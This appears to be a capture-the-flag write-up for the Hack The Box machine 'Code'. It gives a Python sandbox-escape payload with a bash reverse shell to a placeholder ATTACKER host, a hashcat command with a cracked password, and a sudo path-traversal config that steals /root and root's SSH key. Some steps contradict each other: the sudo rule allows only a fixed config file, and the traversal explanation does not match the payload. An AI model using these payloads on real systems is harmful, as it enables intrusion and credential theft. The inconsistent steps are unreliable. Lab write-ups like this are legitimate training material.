---
title: "Code"
difficulty: Easy
os: Linux
points: 20
rating: 4
date: 2025-03-22
avatar: assets/htb/code.png
tags: [Remote Code Execution, Misconfiguration, Directory Traversal, Reconnaissance, Password Cracking, SUDO Exploitation, Python, SQL]
htb_url: https://app.hackthebox.com/machines/Code
---
## Summary

Code is an easy Linux box built around a Python in-browser code editor. The editor blocklists dangerous keywords (e.g. `import`, `os`, `subprocess`, `exec`, `eval`, `open`, `__`), but the filtering is purely string-based, so the execution environment still holds dangerous objects in memory. By walking the object graph via `().__class__.__base__.__subclasses__()` and selecting `subprocess.Popen` by numeric index (commonly 317), I bypass the filter and run arbitrary commands, landing a shell as `app-production`. From there the web-app SQLite database yields bcrypt credentials that crack to user `martin`. Root falls to a `sudo` rule for `/usr/bin/backy.sh` whose JSON config allows path-traversal, letting me archive and read `/root`.

## Enumeration

A full port scan with service detection shows SSH and a Flask app serving a "Python Playground" on port 5000.

```bash
nmap -p- --min-rate=10000 -sV -sC code.htb
# 22  ssh
# 5000  http -> Flask: Python Playground
```

The web app is an editor that lets you submit and execute Python. It filters tokens like `import`, `os`, `exec`, `eval`, `__class__`, `subprocess`, but the runtime still has every loaded class reachable in memory.

## Foothold

Because the blocklist only matches strings, I can reach `subprocess.Popen` without ever naming a banned token directly. The trick is to enumerate the subclasses of `object` and select `Popen` by its list index, avoiding banned identifiers via index access and chained attribute lookups.

```python
# Find subprocess.Popen index (varies; iterate or precompute)
for i, c in enumerate(().__class__.__mro__[-1].__subclasses__()):
    if c.__name__ == 'Popen': print(i)
# e.g. 317

# Bypass: avoid "__" by hex-rope construction, or wrap in getattr()
P = ().__class__.__mro__[-1].__subclasses__()[317]
P(['bash','-c','bash -i >& /dev/tcp/ATTACKER/4444 0>&1'])
```

A common variant uses chained attribute strings via `getattr`/`type` to dodge the `__` filter when it is regex-based. Either way this lands a shell as `app-production`.

For the user pivot, the site's SQLite database (`/var/www/app/instance/database.db`) holds bcrypt hashes for `martin` and others. I crack them with hashcat mode 3200 against rockyou:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
# martin:nafeelswordsmaster
```

With the cracked password I `su martin` (or SSH in as `martin`).

## Privilege Escalation

`martin` is allowed to run `backy.sh` as root without a password:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/backy.sh /root/backy.conf
```

`backy.sh` reads the JSON config and tar-archives whatever is listed in `directories_to_archive`. The path validation in `task.py` strips `/root` but not `..`, so a `..` traversal slips a root path back into the archive set. `sudo` to a script that consumes a JSON config is effectively `sudo` to whatever the script lets the config control:

```bash
mkdir /tmp/exf && cd /tmp/exf
cat > cfg.json <<'EOF'
{
  "destination": "/tmp/exf/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": ["/root/..//root/"]
}
EOF
sudo /usr/bin/backy.sh /tmp/exf/cfg.json
# extract /tmp/exf/code-{date}.tar.bz2 -> root.txt, /root/.ssh/id_rsa
```

Extracting the resulting `code-{date}.tar.bz2` archive gives me `root.txt` and `/root/.ssh/id_rsa`, completing the box.
